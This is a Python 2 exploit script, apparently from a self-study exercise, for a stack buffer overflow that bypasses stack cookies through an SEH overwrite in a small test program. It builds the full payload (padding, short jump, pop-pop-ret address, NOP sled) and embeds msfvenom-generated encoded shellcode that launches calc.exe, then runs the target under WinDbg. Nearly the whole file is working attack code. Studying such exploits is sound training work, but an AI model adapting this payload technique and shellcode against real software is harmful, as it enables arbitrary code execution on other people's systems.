# -*- coding: utf-8 -*-
from subprocess import Popen, PIPE
import os
import struct

windbg_exe = r"C:\Program Files\Debugging Tools for Windows (x86)\windbg.exe"
exe = r"Z:\exploits\6_stack_cookie_bypass_seh\basicbof.cpp\Debug\basicbof.cpp.exe"
payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaaf"
junk = b"A" * 504
nop_sled = b"\x90" * 16
nSEH = b"\xeb\x06\x90\x90" # jump 6 bytes 2 bytes for nops 4 bytes for to jump over seh handler
SEHhandler = struct.pack("<I", 0x7C87BE16) # 0x7C87BE16 pop edi - pop - ret
shellcode = "\xcc" * 4
"""
└─# msfvenom -p windows/exec CMD=calc.exe -e x86/shikata_ga_nai -f python -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
Final size of python file: 1078 bytes
"""
buf =  b""
buf += b"\xdb\xc6\xd9\x74\x24\xf4\xbf\xae\xc7\xdf\xd3\x5b\x33"
buf += b"\xc9\xb1\x31\x31\x7b\x18\x83\xeb\xfc\x03\x7b\xba\x25"
buf += b"\x2a\x2f\x2a\x2b\xd5\xd0\xaa\x4c\x5f\x35\x9b\x4c\x3b"
buf += b"\x3d\x8b\x7c\x4f\x13\x27\xf6\x1d\x80\xbc\x7a\x8a\xa7"
buf += b"\x75\x30\xec\x86\x86\x69\xcc\x89\x04\x70\x01\x6a\x35"
buf += b"\xbb\x54\x6b\x72\xa6\x95\x39\x2b\xac\x08\xae\x58\xf8"
buf += b"\x90\x45\x12\xec\x90\xba\xe2\x0f\xb0\x6c\x79\x56\x12"
buf += b"\x8e\xae\xe2\x1b\x88\xb3\xcf\xd2\x23\x07\xbb\xe4\xe5"
buf += b"\x56\x44\x4a\xc8\x57\xb7\x92\x0c\x5f\x28\xe1\x64\x9c"
buf += b"\xd5\xf2\xb2\xdf\x01\x76\x21\x47\xc1\x20\x8d\x76\x06"
buf += b"\xb6\x46\x74\xe3\xbc\x01\x98\xf2\x11\x3a\xa4\x7f\x94"
buf += b"\xed\x2d\x3b\xb3\x29\x76\x9f\xda\x68\xd2\x4e\xe2\x6b"
buf += b"\xbd\x2f\x46\xe7\x53\x3b\xfb\xaa\x39\xba\x89\xd0\x0f"
buf += b"\xbc\x91\xda\x3f\xd5\xa0\x51\xd0\xa2\x3c\xb0\x95\x5d"
buf += b"\x77\x99\xbf\xf5\xde\x4b\x82\x9b\xe0\xa1\xc0\xa5\x62"
buf += b"\x40\xb8\x51\x7a\x21\xbd\x1e\x3c\xd9\xcf\x0f\xa9\xdd"
buf += b"\x7c\x2f\xf8\xbd\xe3\xa3\x60\x6c\x86\x43\x02\x70"

shellcode = buf

payload = junk + nSEH + SEHhandler + nop_sled + shellcode
p1 = Popen([windbg_exe, exe, payload])
print "pid: %s" % hex(p1.pid)
p1.communicate()
p1.wait()
raw_input("")
